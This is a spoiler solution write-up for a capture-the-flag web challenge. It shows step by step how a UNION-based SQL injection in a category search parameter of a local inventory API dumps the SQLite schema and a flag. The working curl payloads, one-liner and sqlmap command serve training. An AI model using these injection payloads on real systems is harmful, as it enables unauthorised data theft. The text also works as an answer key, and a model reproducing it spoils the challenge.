# WEB-04 — Complete Solution (spoilers)

Replace `TARGET` with the instance entry shown by GZ::CTF
(for example `http://127.0.0.1:32801`).

## 1. Reconnaissance

```bash
TARGET=http://127.0.0.1:32801

# the portal is an ordinary inventory catalogue
curl -s "$TARGET/" | grep -i -m3 'title\|catalog'

# the catalogue API is public and needs no session
curl -s "$TARGET/api/products"        | python3 -m json.tool | head -20
curl -s "$TARGET/api/categories"      | python3 -m json.tool
curl -s "$TARGET/health"              | python3 -m json.tool
```

Expected:

* 12 products, four categories
  (`Facility Safety`, `Industrial Hardware`, `Logistics & Storage`,
  `Office Electronics`)
* health: `{"status":"ok","service":"blackstone-inventory"}`

## 2. Map the two search modes

The UI offers a keyword box and category pills. They hit the same path with
different parameters:

```bash
# keyword search — parameterised
curl -sG "$TARGET/api/products/search" --data-urlencode 'q=printer' | python3 -m json.tool

# category filter — the interesting one
curl -sG "$TARGET/api/products/search" --data-urlencode 'category=Industrial Hardware' \
  | python3 -m json.tool
```

The category filter returns three rows. Now send a quote to see how the value is
handled:

```bash
curl -sG "$TARGET/api/products/search" --data-urlencode "category='" \
  -w '\nHTTP %{http_code}\n'
```

Expected: `HTTP 400` with `{"error":"Invalid search query parameter."}`.

A bare quote changes the result *and* the error is generic — the value is being
parsed as SQL, and the application is hiding the database message. That rules
out error-based extraction and points at a UNION.

## 3. Establish the column count

The projection is visible from any successful query: each row has four keys —
`id`, `name`, `category`, `description`.

```sql
SELECT id, name, category, description FROM products WHERE category = '' OR 1=1-- -
```

```bash
curl -sG "$TARGET/api/products/search" \
  --data-urlencode "category=' OR 1=1-- -" | python3 -c \
  'import json,sys; rows=json.load(sys.stdin); print(len(rows), "rows,", list(rows[0]))'
```

Expected: 12 rows with `['id', 'name', 'category', 'description']`.

## 4. Enumerate the schema

SQLite keeps its schema in `sqlite_master`. Substitute it into the projection:

```bash
# name — column 2 of the projection
curl -sG "$TARGET/api/products/search" \
  --data-urlencode "category=' UNION SELECT 1,sql,3,4 FROM sqlite_master-- -" | python3 -m json.tool
```

This reveals:

```sql
CREATE TABLE products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL,
  category TEXT NOT NULL, description TEXT NOT NULL, price REAL NOT NULL, stock INTEGER NOT NULL)
CREATE TABLE internal_records (id INTEGER PRIMARY KEY AUTOINCREMENT,
  record_name TEXT NOT NULL, classification TEXT NOT NULL, flag TEXT NOT NULL)
```

`internal_records` has exactly four columns and holds a `flag`.

## 5. Extract the flag

```bash
curl -sG "$TARGET/api/products/search" \
  --data-urlencode "category=' UNION SELECT id, record_name, classification, flag FROM internal_records-- -" \
| python3 -m json.tool
```

Expected:

```json
[
  {
    "id": 1,
    "name": "Internal Deployment Record",
    "category": "Restricted",
    "description": "AXUM{database_after_dark_5418ce4d815c}"
  }
]
```

Submit `description` — it is that team's own flag and is accepted only for the
instance it came from.

## 6. One-liner

```bash
TARGET=http://127.0.0.1:32801
curl -sG "$TARGET/api/products/search" \
  --data-urlencode "category=' UNION SELECT id, record_name, classification, flag FROM internal_records-- -" \
| python3 -c 'import json,sys; print([r["description"] for r in json.load(sys.stdin) if r["description"].startswith("AXUM{")][0])'
```

## 7. Notes for the organizer

* Each container deletes and recreates `/app/data/inventory.db`, so every team
  starts from identical seed data and the flag is unique per instance.
* If a team reports the generic 400 for every payload, they are almost always
  missing the `-- -` comment (the original statement already ends with `;`) or
  sending the wrong number of columns.
* `sqlmap` also solves it:
  `sqlmap -u "$TARGET/api/products/search?category=1" -p category --dbms sqlite --dump -T internal_records`
  — this is acceptable; the challenge is about recognising the flaw, not about
  hand-writing the payload.
